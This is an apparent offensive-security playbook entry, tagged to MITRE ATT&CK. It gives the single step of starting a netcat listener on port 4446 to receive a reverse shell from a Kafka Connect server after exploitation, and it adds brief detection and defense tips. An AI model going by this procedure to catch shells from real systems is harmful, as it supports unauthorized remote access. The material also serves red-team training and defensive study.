---
id: uuid-procedure-2
tags:
  - reverse-shell
  - listener
  - nc
type: procedure
tools:
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/nc-listen]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:54.078Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Start-Netcat-Reverse-Shell-Listener

## Summary

This procedure sets up a netcat listener on a VPS to receive an incoming reverse shell from the exploited Kafka Connect server after RCE is triggered.

## Description

Netcat (nc) is used to create a TCP listener on port 4446, allowing the target server to connect back with a shell payload executed via the loaded JVM agent. This step assumes VPS access from the prior procedure and focuses on preparing for the callback. The attack scenario involves the POC script triggering the connection post-exploitation. Expected outcome is an active listener ready for the reverse shell.

## Requirements

1. VPS shell access via SSH
2. Netcat installed on VPS (common on Linux distributions)
3. Port 4446 open in VPS firewall and accessible externally
4. No prior connections on the port

## Defense

Defensive measures and detection strategies:

- Monitor inbound connections on high ports like 4446 using tools like iptables logging or cloud security groups
- Block unsolicited inbound TCP on non-standard ports
- Use intrusion detection systems (IDS) to flag netcat-like traffic patterns

## Objectives

1. Establish a passive TCP listener for reverse shell
2. Ensure verbose output for connection monitoring
3. Prepare for interactive shell upon target callback

## Instructions

### Step 1: Run Netcat Listener

**Context**: Start nc in listen mode to wait for the reverse shell connection from the RCE on Kafka Connect.

**Command** ([[commands/nc-listen]]):
```bash
nc -nlvp 4446
```

> The flags are: -n (no DNS), -l (listen), -v (verbose), -p 4446 (port). This binds to all interfaces on port 4446. Expected output includes "Listening on [0.0.0.0] (family 0, port 4446)" and upon connection, a shell prompt from the target. Keep this running until the POC script executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/nc-listen]]

## Tools Used

- [[tools/nc]]

## Tags

- [[reverse-shell]]
- [[listener]]
- [[tools/nc]]
